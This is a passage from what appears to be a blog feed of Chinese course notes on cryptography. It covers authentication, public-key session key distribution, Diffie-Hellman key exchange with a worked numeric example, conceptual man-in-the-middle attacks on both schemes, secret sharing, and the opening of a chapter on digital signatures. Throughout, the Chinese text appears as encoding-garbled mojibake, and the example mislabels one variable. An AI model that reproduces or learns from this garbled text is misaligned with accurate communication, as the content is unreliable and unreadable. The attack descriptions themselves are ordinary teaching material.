çŠ¶æ€çš„åè®®<ul><li>å¦‚æœåè®®çš„è¿è¡Œéœ€è¦ä¸€äº›å†å²å’Œå½“å‰çš„çŠ¶æ€ä½œä¸ºä¸Šä¸‹æ–‡æ¥ç»´æŠ¤ï¼Œåˆ™ç§°ä¸ºæœ‰çŠ¶æ€çš„åè®®ï¼Œè¿™æ ·ä¸€æ¬¡åè®®çš„è¿è¡Œè¦è€ƒè™‘å†å²çš„çŠ¶æ€ï¼Œä¼šé€ æˆè´Ÿæ‹…æˆ–è€…å¤±åŒæ­¥çš„é—®é¢˜</li><li>å¦‚æœæ¯æ¬¡åè®®è¿è¡Œç‹¬ç«‹äºå†å²çŠ¶æ€å‚æ•°ï¼Œåˆ™æ˜¯æ— çŠ¶æ€çš„ï¼Œå®ç°å’Œèµ„æºå ç”¨æ›´å°‘</li></ul></li></ul></li></ul><h3 id="åŒå‘è®¤è¯å’Œå•å‘è®¤è¯"><a href="#åŒå‘è®¤è¯å’Œå•å‘è®¤è¯" class="headerlink" title="åŒå‘è®¤è¯å’Œå•å‘è®¤è¯"></a>åŒå‘è®¤è¯å’Œå•å‘è®¤è¯</h3><ul><li><p>A å’Œ Bæ˜¯ç½‘ç»œçš„ä¸¤ä¸ªç”¨æˆ· ï¼Œä»–ä»¬æƒ³è¿‡ç½‘ç»œå…ˆå»ºç«‹å®‰å…¨çš„å…±äº«å¯†é’¥åœ¨è¿›è¡Œä¿å¯†é€šä¿¡</p><p><em>A å’Œ B å¦‚ä½•ç¡®ä¿¡è‡ªå·±æ­£åœ¨å’Œé€šä¿¡çš„äººæ˜¯ B å’Œ A è€Œä¸æ˜¯ Cå‘¢ï¼Ÿ</em> å³åŒæ–¹çš„èº«ä»½è®¤è¯</p></li><li><p>è¿™ç§é€šä¿¡æ–¹å¼ä¸º <em>åŒå‘é€šä¿¡</em> ï¼Œæ­¤æ—¶çš„è®¤è¯ç§°ä¸º <em>ç›¸äº’è®¤è¯</em></p><p><em>åŒå‘è®¤è¯ä¹Ÿå«ç›¸äº’è®¤è¯ åŒæ–¹è®¤è¯ç­‰</em></p></li><li><p>ç±»ä¼¼åœ° å¯¹äº <em>å•å‘é€šä¿¡</em> æ¥è¯´ï¼Œè®¤è¯ç§°ä¸º <em>å•å‘è®¤è¯</em></p></li></ul><h3 id="åŒ…å«å¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯"><a href="#åŒ…å«å¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯" class="headerlink" title="åŒ…å«å¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯"></a>åŒ…å«å¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯</h3><ul><li>A å’Œ B ç›´æ¥è¿›è¡Œè®¤è¯çš„å‰ææ˜¯äºŒè€…ä¹‹é—´å…·æœ‰å…±äº«çš„å¯†é’¥ï¼Œæœ‰æ—¶åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¿™ç§æ–¹å¼å¹¶ä¸å®ç”¨ï¼Œå› ä¸ºç”¨æˆ·å¤šæ˜¯ä¸¤ä¸¤ç”¨æˆ·ä¹‹é—´éƒ½è¦å…±äº«å¯†é’¥ï¼Œå› æ­¤ä¸€ç§æ›´ä¸ºå¸¸è§çš„æ–¹å¼æ˜¯åŸºäºå¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯</li><li>è¿™æ—¶ï¼ŒåŒæ–¹éƒ½ä¸å¯ä¿¡ç¬¬ä¸‰æ–¹å…±äº«åˆå§‹å¯†é’¥ï¼Œç³»ç»Ÿæ‰©å±•æ€§å¥½ï¼Œä¾¿äºå¯†é’¥ç®¡ç†ï¼Œå€ŸåŠ©å¯ä¿¡ç¬¬ä¸‰æ–¹æä¾›çš„å¸®åŠ©æ¥å®ç°è®¤è¯å’Œå¯†é’¥åå•†</li><li>å¯ä¿¡ç¬¬ä¸‰æ–¹å¯ä»¥åœ¨çº¿ä¹Ÿå¯ä»¥ç¦»çº¿</li></ul><h4 id="å»ºç«‹å…±äº«å¯†é’¥"><a href="#å»ºç«‹å…±äº«å¯†é’¥" class="headerlink" title="å»ºç«‹å…±äº«å¯†é’¥"></a>å»ºç«‹å…±äº«å¯†é’¥</h4><ul><li><p>A å’Œ B ä¸¤ä¸ªç”¨æˆ·åœ¨ <em>å»ºç«‹å…±äº«å¯†é’¥æ—¶</em> éœ€è¦è€ƒè™‘çš„æ ¸å¿ƒé—®é¢˜æ˜¯ <em><strong>ä¿å¯†æ€§å’Œå®æ—¶æ€§</strong></em></p></li><li><p>ä¿å¯†æ€§ï¼š ä¸ºé˜²æ­¢ä¼šè¯å¯†é’¥çš„ä¼ªé€ æˆ–æ³„éœ²ï¼Œ<em>ä¼šè¯å¯†é’¥åœ¨é€šä¿¡åŒæ–¹ä¹‹é—´äº¤æ¢æ—¶åº”ä¸ºå¯†æ–‡å½¢å¼ï¼Œæ‰€ä»¥é€šä¿¡åŒæ–¹äº‹å…ˆå°±åº”è¯¥æœ‰å¯†é’¥æˆ–å…¬å¼€é’¥</em></p></li><li><p>å®æ—¶æ€§å³æ–°é²œæ€§ï¼Œå¯ä½¿ç”¨å‰è¿°çš„åŸºæœ¬è®¤è¯æŠ€æœ¯ï¼ˆæ—¶é—´æˆ³ and è¯¢é—®-åº”ç­”ï¼‰</p></li><li><p>é€šä¿¡åŒæ–¹å»ºç«‹å…±äº«å¯†é’¥æ—¶å¯é‡‡ç”¨ <em>å¯¹ç§°å¯†é’¥åŠ å¯†ä½“åˆ¶</em> å’Œ <em>å…¬é’¥åŠ å¯†ä½“åˆ¶</em></p></li></ul><h3 id="åŸºäºå…¬é’¥åŠ å¯†å’Œä¼šè¯å¯†é’¥çš„åˆ†é…åè®®"><a href="#åŸºäºå…¬é’¥åŠ å¯†å’Œä¼šè¯å¯†é’¥çš„åˆ†é…åè®®" class="headerlink" title="åŸºäºå…¬é’¥åŠ å¯†å’Œä¼šè¯å¯†é’¥çš„åˆ†é…åè®®"></a>åŸºäºå…¬é’¥åŠ å¯†å’Œä¼šè¯å¯†é’¥çš„åˆ†é…åè®®</h3><ul><li>ç”±äº <em>å…¬é’¥åŠ å¯†çš„é€Ÿåº¦è¿‡æ…¢</em> ï¼Œå› æ­¤è¿›è¡Œä¿å¯†é€šä¿¡ä¸å¤ªåˆé€‚ï¼Œä½† <em>ç”¨äºåˆ†é…å¯¹ç§°å¯†é’¥å¯†ç ä½“åˆ¶çš„å¯†é’¥å´éå¸¸åˆé€‚</em></li></ul><h4 id="å¯†é’¥åˆ†é…"><a href="#å¯†é’¥åˆ†é…" class="headerlink" title="å¯†é’¥åˆ†é…"></a>å¯†é’¥åˆ†é…</h4><ul><li><p>ä¸‹å›¾è¡¨ç¤ºç®€å•ä½¿ç”¨å…¬é’¥åŠ å¯†ç®—æ³•å»ºç«‹ä¼šè¯å¯†é’¥è¿‡ç¨‹ï¼Œå¦‚æœAå¸Œæœ›ä¸Bé€šä¿¡ï¼Œå¯é€šè¿‡ä»¥ä¸‹å‡ æ­¥å»ºç«‹ä¼šè¯å¯†é’¥</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161524512.png"></p></li></ul><ol><li>Aäº§ç”Ÿè‡ªå·±çš„ä¸€å¯¹å¯†é’¥$\lbrace PK_A,SK_A \rbrace$, å¹¶å‘Bå‘é€ $PK_A \left| \right| ID_A$,å…¶ä¸­$ID_A$ è¡¨ç¤ºAçš„èº«ä»½</li><li>Bäº§ç”Ÿä¼šè¯å¯†é’¥ $K_S$ ,å¹¶ç”¨Açš„å…¬å¼€é’¥ $PK_A$ å¯¹ $K_S$ åŠ å¯†åå‘å¾€A</li><li>Aç”± $D_{SKA} \left[E_{PK_A} \left[K_S \right]\right]$ æ¢å¤å¯†é’¥ï¼Œå› ä¸ºåªæœ‰Aèƒ½è§£è¯» $K_S$ ï¼Œæ‰€ä»¥ä»…Aå’ŒBçŸ¥é“è¿™ä¸€å…±äº«å¯†é’¥</li><li>Aé”€æ¯ $\lbrace PK_A SK_A \rbrace$ ,Bé”€æ¯ $PK_A$</li></ol><ul><li>Aã€Bç°åœ¨å¯ä»¥ç”¨å•é’¥åŠ å¯†ç®—æ³•ä»¥ $K_S$ ä½œä¸ºä¼šè¯å¯†é’¥è¿›è¡Œä¿å¯†é€šä¿¡ï¼Œé€šä¿¡å®Œæˆåï¼Œåˆéƒ½å°† $K_S$ é”€æ¯</li><li>è¿™ç§åˆ†é…æ–¹æ³•å°½ç®¡ç®€å•ï¼Œä½†å´ç”±äºAã€BåŒæ–¹åœ¨é€šä¿¡å‰å’Œå®Œæˆé€šä¿¡åï¼Œ<em>éƒ½æœªå­˜å‚¨å¯†é’¥</em> å› æ­¤ï¼Œ<em>å¯†é’¥æ³„éœ²çš„å±é™©æ€§ä¸ºæœ€å°ï¼Œä¸”å¯ä»¥é˜²æ­¢åŒæ–¹çš„é€šä¿¡è¢«æ•Œæ‰‹ç›‘å¬</em><ul><li>æ¯æ¬¡å…¬ç§é’¥ç”±å‘æ–¹ä¸´æ—¶äº§ç”Ÿ</li></ul></li><li>ä½†ç”±äºå…¬é’¥ç¼ºå°‘è¯ä¹¦ç®¡ç†æœºæ„è®¤è¯ä¸”éç‰©ç†ä¼ è¾“å®¹æ˜“å—åˆ°ä¸»åŠ¨æ”»å‡»</li></ul><h4 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h4><p>å¦‚æœæ•Œæ‰‹Eå·²æ¥å…¥Aã€BåŒæ–¹çš„é€šä¿¡ä¿¡é“ï¼Œå°±å¯é€šè¿‡ä»¥ä¸‹ä¸è¢«å¯Ÿè§‰çš„æ–¹å¼æˆªè·åŒæ–¹çš„é€šä¿¡ï¼š</p><ol><li><p>Eæˆªè·Açš„å‘é€åï¼Œå»ºç«‹è‡ªå·±çš„ä¸€å¯¹å¯†é’¥ $\lbrace PK_E,SK_E\rbrace$, å¹¶å°† $PK_E \left| \right | ID_A$ å‘é€ç»™B</p><p>å³æŠŠåŸæœ¬è¦å‘é€çš„$PK_A$ æ›¿æ¢ä¸º$PK_E$</p></li><li><p>Bäº§ç”Ÿä¼šè¯å¯†é’¥ $K_S$ åï¼Œå°† $E_{PKE}\left[K_S \right]$ å‘é€å‡ºå»</p></li><li><p>Eæˆªè·Bå‘é€çš„æ¶ˆæ¯åï¼Œç”± $D_{PKE} \left[ E_{PK_E}\left[ K_S\right] \right]$ è§£è¯»å‡º $K_S$</p></li><li><p>Eå†å°† $E_{PK_A}\left[K_S \right]$ å‘é€ A</p></li></ol><p>ç°åœ¨Aå’ŒBçŸ¥é“ $K_S$ ï¼Œä½†å¹¶æœªæ„è¯†åˆ° $K_S$ å·²è¢«Eæˆªè·ï¼ŒAã€Båœ¨ç”¨$K_S$ é€šä¿¡æ—¶ï¼ŒEå°±å¯ä»¥å®æ—¶ç›‘å¬</p><h2 id="Diffie-Hellman-å¯†é’¥äº¤æ¢"><a href="#Diffie-Hellman-å¯†é’¥äº¤æ¢" class="headerlink" title="Diffie-Hellman å¯†é’¥äº¤æ¢"></a>Diffie-Hellman å¯†é’¥äº¤æ¢</h2><h3 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><ul><li><p>å¯†é’¥äº¤æ¢æ˜¯å®ç°å®‰å…¨é€šä¿¡çš„åŸºç¡€</p><p>å•†ç”¨åŠ å¯†ç®—æ³•AESå’ŒDESéœ€è¦åœ¨å®‰å…¨é€šä¿¡ä¹‹å‰ï¼Œå®ç°é€šä¿¡åŒæ–¹çš„å¯†é’¥å…±äº«</p></li><li><p>å¯†é’¥äº¤æ¢çš„æ–¹æ³•</p><ul><li>åŸºäºRSAçš„å¯†é’¥äº¤æ¢</li><li>åŸºäºKDCæŠ€æœ¯ï¼ˆKey Distributed Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒ)</li><li><em><strong>Diffile-Hellmanå¯†é’¥äº¤æ¢ï¼ˆç®€ç§°ï¼šDHç®—æ³•ï¼‰</strong></em></li><li>åŸºäºç‰©ç†å±‚çš„å¯†é’¥äº¤æ¢</li></ul></li><li><p>DHç®—æ³•æ˜¯ä¸å®‰å…¨ä¿¡é“ä¸‹å®ç°å®‰å…¨å¯†é’¥å…±äº«çš„ä¸€ç§æ–¹æ³•ï¼Œç”± W.Diffie å’Œ M.Hellman åœ¨1976å¹´æå‡ºçš„ç¬¬ä¸€ä¸ªå…¬å¼€çš„å…¬é’¥å¯†ç ç®—æ³•</p></li></ul><h3 id="äº¤æ¢æµç¨‹"><a href="#äº¤æ¢æµç¨‹" class="headerlink" title="äº¤æ¢æµç¨‹"></a>äº¤æ¢æµç¨‹</h3><ul><li>ç”¨æˆ·Aå’ŒBåå•†ä¸€ä¸ª<em><strong>ç´ æ•°p</strong></em>ï¼Œä»¥åŠè¯¥ç´ æ•°çš„<em><strong>æœ¬åŸå…ƒg</strong></em></li><li>ç”¨æˆ·Aé€‰æ‹©ä¸€ä¸ªéšæœºæ•° $xï¼Œx&lt;p$ ï¼Œç”¨æˆ·Bé€‰æ‹©ä¸€ä¸ªéšæœºæ•° $yï¼Œy&lt;p$</li><li>ç”¨æˆ·Aè®¡ç®— $Y_A &#x3D; g^x \bmod p$ ï¼Œç”¨æˆ·Bè®¡ç®— $Y_B &#x3D; g^y \bmod p$ </li><li>ç”¨æˆ·Aï¼Œç”¨æˆ·Bäº¤æ¢ $Y_A$ ï¼Œ$Y_B$</li><li>ç”¨æˆ·Aè®¡ç®—å¯†é’¥ $K &#x3D; {Y_B}^x &#x3D; g^{xy} \bmod p$ ç”¨æˆ·Bè®¡ç®—å¯†é’¥ $K &#x3D; {Y_A}^y &#x3D; g^{xy} \bmod p$</li><li>å®Œæˆå¯†é’¥åå•†</li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161606279.png"></p><ul><li>ä¾‹å­<ul><li>å‡è®¾ç´ æ•° $p &#x3D; 97$ ï¼Œå…¶æœ¬åŸå…ƒ $g&#x3D;5$</li><li>ç”¨æˆ·Aé€‰å–éšæœºæ•° $x&#x3D;36$ ï¼Œç”¨æˆ·Bé€‰å–éšæœºæ•° $ x&#x3D; 58 $</li><li>ç”¨æˆ·Aè®¡ç®—ï¼š$Y_A \equiv g^x \equiv 5^{36}  \equiv 50 \bmod  97 $</li><li>ç”¨æˆ·Bè®¡ç®—ï¼š$Y_B \equiv g^y \equiv 5^{58}\equiv 44 \bmod 97 $</li><li>äº¤æ¢ $Y_A$ ï¼Œ$Y_B$</li><li>ç”¨æˆ·Aè®¡ç®—å¯†é’¥ï¼š$K \equiv {Y_B}^x \equiv g^{xy} \equiv 44^{36}  \equiv 75\bmod 97$</li><li>ç”¨æˆ·Bè®¡ç®—å¯†é’¥ï¼š$K \equiv {Y_A}^y \equiv g^{xy} \equiv 50^{58}  \equiv 75\bmod 97$</li></ul></li></ul><h3 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h3><h4 id="å®‰å…¨æ€§åˆ†æ"><a href="#å®‰å…¨æ€§åˆ†æ" class="headerlink" title="å®‰å…¨æ€§åˆ†æ"></a>å®‰å…¨æ€§åˆ†æ</h4><ul><li><p>å…¬å¼€å¯æˆªè·çš„ä¿¡æ¯ <em><strong>ç´ æ•° $p$<em><strong>ã€</strong></em>æœ¬åŸå…ƒ $ g $</strong></em> ã€ä¸­é—´å€¼ $Y_A$ $Y_B$</p></li><li><p>è‹¥æ”»å‡»è€…æƒ³è¦è·å–å¯†é’¥ $K$ å¿…é¡»é€šè¿‡<br>$ Y_A \equiv g^x \bmod p $ å’Œ $ Y_B \equiv g^y \bmod p $</p><p>è®¡ç®—å‡º $x$ å’Œ $y$ ï¼Œç„¶è€Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå›°éš¾çš„é—®é¢˜</p></li><li><p>å› æ­¤ï¼Œç®—æ³•çš„å®‰å…¨æ€§åŸºæ±‚äºç¦»æ•£å¯¹æ•°çš„å›°éš¾æ€§</p></li></ul><h4 id="å…¶ä½™å®‰å…¨é—®é¢˜"><a href="#å…¶ä½™å®‰å…¨é—®é¢˜" class="headerlink" title="å…¶ä½™å®‰å…¨é—®é¢˜"></a>å…¶ä½™å®‰å…¨é—®é¢˜</h4><ul><li>å®¹æ˜“é­å—é˜»å¡æ”»å‡»ï¼šå› ä¸ºå¹‚è¿ç®—æ—¶è®¡ç®—å¯†æ€§çš„ï¼Œå½“æ•Œæ‰‹å‘èµ·å¤§é‡çš„å¯†é’¥è¯·æ±‚ï¼Œå—æ”»å‡»è€…å°†èŠ±è´¹å¤§è®¡ç®—èµ„æºæ¥åšå¹‚è¿ç®—</li><li>å®¹æ˜“é­å— <em><strong>ä¸­é—´äººæ”»å‡»</strong></em> ï¼šæ•Œæ‰‹å¯åˆ†åˆ«å†’å……ç”¨æˆ·Aå’Œç”¨æˆ·Bä¸­çš„ä¸€æ–¹ï¼Œä¸å¦ä¸€æ–¹äº¤æ¢å¯†é’¥ï¼Œä»è€Œå®ç°ç›‘å¬</li></ul><h4 id="ä¸­é—´äººæ”»å‡»-1"><a href="#ä¸­é—´äººæ”»å‡»-1" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h4><ul><li><p>ç°æœ‰ç”¨æˆ·A ã€ç”¨æˆ·B  ã€ä¸­é—´äººC</p></li><li><p>ç”¨æˆ·A ã€ç”¨æˆ·B æ­£å¸¸åå•†ä¸€ä¸ª <em><strong>ç´ æ•°</strong></em> $p$ ,<em><strong>æœ¬åŸå…ƒ</strong></em> g </p></li><li><p>ç”¨æˆ·A ã€ç”¨æˆ·B æ­£å¸¸é€‰æ‹©è‡ªå·±çš„éšæœºæ•° $x$ , $y$ ï¼Œå¹¶è®¡ç®— </p><p>$Y_A \equiv g^x \bmod p$ å’Œ $Y_B \equiv g^y \bmod p$</p></li><li><p>ä¸­é—´äººC é€‰æ‹©éšæœºæ•° $z$ ,è®¡ç®— $Y_C \equiv g^Z \bmod p$ </p></li><li><p>ä¸­é—´äººæˆªè·ç”¨æˆ·Aä¼ é€’çš„ $Y_A$ </p><ul><li>åˆ©ç”¨ $Y_A$ è®¡ç®— $K_{AC} \equiv {Y_A}^z \equiv g^{xz} \bmod p$</li><li>å¹¶å°† $Y_C$ ä¼ ç»™ç”¨æˆ·B</li><li>ç”¨æˆ·Bæ ¹æ® $Y_C$ è®¡ç®— $K_{BC} \equiv {Y_C}^y \equiv g^{yz}\bmod p$</li></ul></li><li><p>ä¸­é—´äººæˆªè·ç”¨æˆ·Bä¼ é€’çš„ $Y_B$ </p><ul><li>åˆ©ç”¨ $Y_B$ è®¡ç®— $K_{BC} \equiv {Y_B}^z \equiv g^{yz} \bmod p$</li><li>å¹¶å°† $Y_C$ ä¼ ç»™ç”¨æˆ·A</li><li>ç”¨æˆ·Aæ ¹æ® $Y_C$ è®¡ç®— $K_{AC} \equiv {Y_C}^x \equiv g^{xz}\bmod p$</li></ul></li><li><p>æ­¤æ—¶ç”¨æˆ·Aä»¥ä¸ºå…±äº«å¯†é’¥æ˜¯ $K_{AC}$ ,ç”¨æˆ·Bä»¥ä¸ºå…±äº«å¯†é’¥æ˜¯ $K_{BC}$ ï¼Œè€Œä¸­é—´äººæ‹¥æœ‰ $K_{AC}$ ï¼Œ $K_{BC}$ ï¼Œå¯ä»¥ç›‘å¬ç”¨æˆ·Aå’Œç”¨æˆ·B</p></li></ul><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306161740612.png"></p><h2 id="ç§˜å¯†å…±äº«"><a href="#ç§˜å¯†å…±äº«" class="headerlink" title="ç§˜å¯†å…±äº«"></a>ç§˜å¯†å…±äº«</h2><p>é—®é¢˜å¼•å…¥ï¼š</p><ul><li>ä¿é™©æŸœçš„å¼€å¯ <ul><li>ä¿é™©æŸœä¸­å­˜æ”¾æœ‰10ä¸ªäººçš„å…±æœ‰è´¢äº§ </li><li>è¦ä»ä¿é™©æŸœä¸­å–å‡ºç‰©å“ï¼Œå¿…é¡»æœ‰ <em><strong>åŠæ•°ä»¥ä¸Š</strong></em> çš„äººåœ¨åœºæ‰å¯å–å‡ºï¼ŒåŠæ•°ä»¥ä¸‹åˆ™ä¸è¡Œ</li><li>å¦‚ä½•æ„é€ é”çš„è®¾è®¡æ–¹æ¡ˆ</li></ul></li><li>å¯¼å¼¹æ§åˆ¶å‘å°„ï¼Œé‡è¦åœºæ‰€é€šè¡Œæ£€éªŒï¼Œé€šå¸¸éœ€è¦å¤šäººåŒæ—¶å‚ä¸æ‰èƒ½ç”Ÿæ•ˆï¼Œéœ€è¦å°†ç§˜å¯†åˆ†ä¸ºå¤šäººæŒç®¡ï¼Œå¹¶ä¸”ç”±<em><strong>ä¸€å®š</strong></em> æŒç®¡ç§˜å¯†çš„äººæ•°åŒæ—¶åˆ°åœºæ‰èƒ½æ¢å¤ç§˜å¯†</li></ul><h3 id="æ¦‚å¿µ-2"><a href="#æ¦‚å¿µ-2" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><ul><li><p>å®šä¹‰</p><p>ç§˜å¯† <em>s</em> ï¼ˆé€šè¿‡æŸç§æ–¹æ¡ˆï¼‰è¢«åˆ†å‰²æˆnä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†ç§°ä¸º <em><strong>ä»½é¢ï¼ˆshareï¼‰</strong></em> æˆ– <em><strong>å½±å­ï¼ˆshadowï¼‰</strong></em> ï¼Œç”±ä¸€ä¸ªå‚ä¸è€…æŒæœ‰ï¼Œä½¿å¾—ï¼š </p><ul><li>ç”± <em><strong>k</strong></em> ä¸ªæˆ–å¤šäº <em><strong>k</strong></em> ä¸ªå‚ä¸è€…æ‰€æŒæœ‰çš„éƒ¨åˆ†ä¿¡æ¯å¯é‡æ„ <em>s</em> ã€‚ </li><li>ç”±å°‘äº <em><strong>k</strong></em> ä¸ªå‚ä¸è€…æ‰€æŒæœ‰çš„éƒ¨åˆ†ä¿¡æ¯åˆ™æ— æ³•é‡æ„ <em>s</em> ã€‚ </li><li>ç§°è¯¥æ–¹æ¡ˆä¸º <em><strong>$(kï¼Œn)$ ç§˜å¯†åˆ†å‰²é—¨é™æ–¹æ¡ˆ</strong></em> ï¼Œ<em>k</em> ç§°ä¸ºé—¨é™å€¼ï¼Œå°‘äº <em><strong>k</strong></em> ä¸ªå‚ä¸è€…æ‰€æŒæœ‰çš„éƒ¨åˆ†ä¿¡æ¯å¾—ä¸åˆ° <em>s</em> ä»»ä½•ä¿¡æ¯ç§°è¯¥ <em><strong>é—¨é™æ–¹æ¡ˆæ˜¯å®Œå–„çš„</strong></em></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Crypt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬å…­ç«  æ•°å­—ç­¾å</title>
    <link href="/2023/05/30/Digital%20Signature/"/>
    <url>/2023/05/30/Digital%20Signature/</url>
    
    <content type="html"><![CDATA[<p>æ€¥æ€¥æ€¥ æœŸæœ«é¢„ä¹ æ€¥æ€¥æ€¥</p><span id="more"></span><h2 id="æ•°å­—ç­¾ååŸºæœ¬æ¦‚å¿µ"><a href="#æ•°å­—ç­¾ååŸºæœ¬æ¦‚å¿µ" class="headerlink" title="æ•°å­—ç­¾ååŸºæœ¬æ¦‚å¿µ"></a>æ•°å­—ç­¾ååŸºæœ¬æ¦‚å¿µ</h2><h3 id="æ•°å­—ç­¾åæ¦‚å¿µ"><a href="#æ•°å­—ç­¾åæ¦‚å¿µ" class="headerlink" title="æ•°å­—ç­¾åæ¦‚å¿µ"></a>æ•°å­—ç­¾åæ¦‚å¿µ</h3><ul><li><p>ä½¿ç”¨ <em>å…¬é’¥</em> åŠ å¯†æŠ€æœ¯å®ç°ï¼Œç”¨äº <em>é‰´åˆ«æ•°å­—ä¿¡æ¯ä¸ç­¾åè€…èº«ä»½</em> çš„æ–¹æ³•</p></li><li><p>ä»¥ <em>ç”µå­æ–¹å¼</em> å­˜å‚¨ç­¾åä¿¡æ¯ï¼Œåœ¨ <em>æ•°å­—æ–‡æ¡£</em> ä¸Šèº«ä»½éªŒè¯ã€‚ æ¥æ”¶è€…å’Œç¬¬ä¸‰æ–¹èƒ½å¤Ÿ <em>éªŒè¯</em> æ–‡æ¡£ <em>æ¥è‡ª</em> ç­¾åè€…ï¼Œå¹¶ä¸”æ–‡æ¡£ç­¾åå <em>æ²¡æœ‰è¢«ä¿®æ”¹</em>ï¼Œ</p></li></ul><p>ç­¾åè€…ä¹Ÿ <em>ä¸èƒ½å¦è®¤</em> å¯¹æ–‡æ¡£çš„ç­¾å</p><p>æ•°å­—ç­¾åå¿…é¡»ä¿éšœï¼š</p><p>ï¼ˆ1ï¼‰ æ¥æ”¶è€…èƒ½å¤Ÿ <em>æ ¸å®</em> å‘é€è€…å¯¹æ–‡æ¡£çš„ç­¾å</p><p>ï¼ˆ2ï¼‰ å‘é€è€…äº‹å <em>ä¸èƒ½å¦è®¤</em> å¯¹æ–‡æ¡£çš„ç­¾å</p><p>ï¼ˆ3ï¼‰ <em>ä¸èƒ½ä¼ªé€ </em> å¯¹æ–‡æ¡£çš„ç­¾å</p><h3 id="æ•°å­—ç­¾åè½½ä½“"><a href="#æ•°å­—ç­¾åè½½ä½“" class="headerlink" title="æ•°å­—ç­¾åè½½ä½“"></a>æ•°å­—ç­¾åè½½ä½“</h3><ul><li>ä¸€ä¸ªç­¾åæœ‰ <em>æ¶ˆæ¯</em> å’Œ <em>è½½ä½“</em> ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå³ç­¾åæ‰€è¡¨ç¤ºçš„ <em>æ„ä¹‰</em> å’Œç­¾åçš„ <em>ç‰©ç†è¡¨ç°å½¢å¼</em></li></ul><h4 id="ä¼ ç»Ÿç­¾å-VS-æ•°å­—ç­¾å"><a href="#ä¼ ç»Ÿç­¾å-VS-æ•°å­—ç­¾å" class="headerlink" title="ä¼ ç»Ÿç­¾å VS æ•°å­—ç­¾å"></a>ä¼ ç»Ÿç­¾å VS æ•°å­—ç­¾å</h4><ul><li>ä¼ ç»Ÿç­¾åä¸­ï¼Œç­¾åä¸æ–‡ä»¶æ˜¯ä¸€ä¸ª <em>ç‰©ç†æ•´ä½“</em><ul><li>å…·æœ‰ <em>å…±åŒ</em> çš„è½½ä½“</li><li>ç‰©ç†ä¸Šçš„ <em>ä¸å¯åˆ†å‰²</em> <em>ä¸å¯å¤åˆ¶</em> çš„ç‰¹æ€§</li><li>ç­¾åä¸æ–‡ä»¶çš„ <em>ä¸å¯åˆ†å‰²</em> å’Œ <em>ä¸èƒ½é‡å¤</em> ä½¿ç”¨</li></ul></li><li>æ•°å­—ç­¾åä¸­ï¼Œç­¾åä¸æ–‡ä»¶æ˜¯ç”µå­å½¢å¼<ul><li><em>æ²¡æœ‰å›ºå®šçš„ç‰©ç†è½½ä½“</em> å³ç­¾åä¸æ–‡ä»¶çš„ç‰©ç†å½¢å¼å’Œæ¶ˆæ¯å·²ç»åˆ†å¼€</li><li>ç”µå­è½½ä½“æ˜¯å¯ä»¥ <em>ä»»æ„åˆ†å‰²</em> <em>å¤åˆ¶</em> çš„</li></ul></li><li>ä¼ ç»Ÿç­¾åçš„éªŒè¯æ˜¯é€šè¿‡ <em>ä¸å­˜æ¡£æ‰‹è¿¹å¯¹ç…§æ¥ç¡®å®šçœŸä¼ªçš„</em> æ˜¯ <em>ä¸»è§‚çš„ã€æ¨¡ç³Šçš„ã€å®¹æ˜“ä¼ªé€ çš„</em> ï¼Œä»è€Œä¹Ÿæ˜¯ <em>ä¸å®‰å…¨çš„</em></li><li>æ•°å­—ç­¾ååˆ™ä½¿ç”¨ <em>å¯†ç </em> ï¼Œé€šè¿‡ <em>å…¬å¼€ç®—æ³•å¯ä»¥æ£€éªŒçš„</em> ï¼Œæ˜¯<em>å®¢è§‚çš„ã€ç²¾ç¡®çš„ã€åœ¨è®¡ç®—ä¸Šçš„æ˜¯å®‰å…¨çš„</em></li></ul><h4 id="ä¼ ç»Ÿç­¾ååŸºæœ¬ç‰¹ç‚¹ï¼š"><a href="#ä¼ ç»Ÿç­¾ååŸºæœ¬ç‰¹ç‚¹ï¼š" class="headerlink" title="ä¼ ç»Ÿç­¾ååŸºæœ¬ç‰¹ç‚¹ï¼š"></a>ä¼ ç»Ÿç­¾ååŸºæœ¬ç‰¹ç‚¹ï¼š</h4><ul><li>èƒ½ä¸è¢«ç­¾æ–‡ä»¶åœ¨ç‰©ç†ä¸Š <em>ä¸å¯åˆ†å‰²</em></li><li>ç­¾åè€… <em>ä¸èƒ½å¦è®¤</em> è‡ªå·±çš„ç­¾å</li><li>ç­¾å <em>èƒ½è¢«ä¼ªé€ </em></li><li><em>å®¹æ˜“</em> è¢«éªŒè¯</li></ul><h4 id="æ•°å­—ç­¾åæ˜¯ä¼ ç»Ÿç­¾åçš„æ•°å­—åŒ–ï¼Œè¦æ±‚ï¼š"><a href="#æ•°å­—ç­¾åæ˜¯ä¼ ç»Ÿç­¾åçš„æ•°å­—åŒ–ï¼Œè¦æ±‚ï¼š" class="headerlink" title="æ•°å­—ç­¾åæ˜¯ä¼ 